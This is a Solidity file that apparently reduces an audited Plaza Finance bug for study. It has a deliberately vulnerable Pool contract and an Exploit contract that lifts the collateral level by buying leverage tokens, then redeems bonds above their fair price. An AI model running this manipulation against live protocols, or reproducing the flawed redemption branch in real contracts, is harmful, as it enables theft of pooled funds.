// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Plaza Finance — BondToken sold above the sub-120% price (Sherlock #896, finding 49239)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: getRedeemAmount pays BondToken the full target price once collateralLevel
    is above 120%. Buying LeverageToken lifts a pool sitting on that line over it.
    The blamed branch is preserved verbatim below (@> VULN). */

contract Usd {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Pool {
    uint256 public constant PRECISION = 1e18;
    uint256 public constant BOND_TARGET_PRICE = 100;
    uint256 public constant COLLATERAL_THRESHOLD = 12e17;
    uint256 public constant POINT_EIGHT = 8e17;
    uint256 public constant POINT_TWO = 2e17;

    Usd public usd;
    uint256 public tvl;
    uint256 public bondSupply;
    uint256 public levSupply;
    mapping(address => uint256) public bondBal;
    mapping(address => uint256) public levBal;

    constructor(Usd _usd) {
        usd = _usd;
    }

    function init(uint256 _tvl, uint256 bonds, uint256 levs, address holder) external {
        tvl = _tvl;
        bondSupply = bonds;
        levSupply = levs;
        bondBal[holder] = bonds;
        usd.transferFrom(msg.sender, address(this), _tvl);
    }

    function buyLeverage(uint256 amount) external {
        uint256 cost = amount * ((tvl * POINT_TWO) / levSupply) / PRECISION;
        usd.transferFrom(msg.sender, address(this), cost);
        tvl += cost;
        levSupply += amount;
        levBal[msg.sender] += amount;
    }

    /// @dev Lines 511-516 of Pool.getRedeemAmount, reduced to the two token types in issue 896.
    function getRedeemAmount(uint8 tokenType, uint256 depositAmount) public view returns (uint256) {
        uint256 collateralLevel;
        uint256 multiplier = POINT_EIGHT;
        uint256 assetSupply;
        if (tokenType == 0) {
            collateralLevel = ((tvl - (depositAmount * BOND_TARGET_PRICE)) * PRECISION)
                / ((bondSupply - depositAmount) * BOND_TARGET_PRICE);
            assetSupply = bondSupply;
        } else {
            multiplier = POINT_TWO;
            assetSupply = levSupply;
            collateralLevel = (tvl * PRECISION) / (bondSupply * BOND_TARGET_PRICE);
        }

        uint256 redeemRate;
        if (collateralLevel <= COLLATERAL_THRESHOLD) {
            redeemRate = (tvl * multiplier) / assetSupply;
        } else if (tokenType == 1) {
            redeemRate = ((tvl - (bondSupply * BOND_TARGET_PRICE)) / assetSupply) * PRECISION;
        } else {
            // @> VULN: collateralLevel above 120% pays BondToken the full target price of 100
            redeemRate = BOND_TARGET_PRICE * PRECISION;
            // FIX: keep the sub-threshold 80% allocation, or snapshot collateralLevel before the leverage buy
        }
        return (depositAmount * redeemRate) / PRECISION;
    }

    function redeem(uint8 tokenType, uint256 amount) external returns (uint256 payout) {
        payout = getRedeemAmount(tokenType, amount);
        if (tokenType == 0) {
            bondBal[msg.sender] -= amount;
            bondSupply -= amount;
        } else {
            levBal[msg.sender] -= amount;
            levSupply -= amount;
        }
        tvl -= payout;
        usd.transfer(msg.sender, payout);
    }
}

contract Exploit {
    Usd public usd; // CREATE nonce 1
    Pool public pool; // CREATE nonce 2
    uint256 public fair;
    uint256 public bondsOut;
    uint256 public levOut;
    uint256 public profit;

    constructor() {
        usd = new Usd();
        pool = new Pool(usd);
        usd.mint(address(this), 11220);
        usd.approve(address(pool), type(uint256).max);
        // Issue 896 opening state: lev 100, bond 100, TVL 11000. Bob already holds 50 of the bonds and 220 cash.
        pool.init(11000, 100, 100, address(this));
    }

    function run() external {
        fair = pool.getRedeemAmount(0, 50);
        pool.buyLeverage(10);
        bondsOut = pool.redeem(0, 50);
        levOut = pool.redeem(1, 10);
        profit = usd.balanceOf(address(this)) - 220;
        require(fair == 4400, "fair redemption");
        require(bondsOut == 5000, "manipulated bond payout");
        require(levOut == 110, "leverage sold back");
        require(profit == 4890, "net cash");
        require(profit - fair == 490, "excess over fair");
    }

    /// @dev Control entry. Not called from run().
    function redeemWithoutLift() external returns (uint256 payout) {
        payout = pool.redeem(0, 50);
    }
}
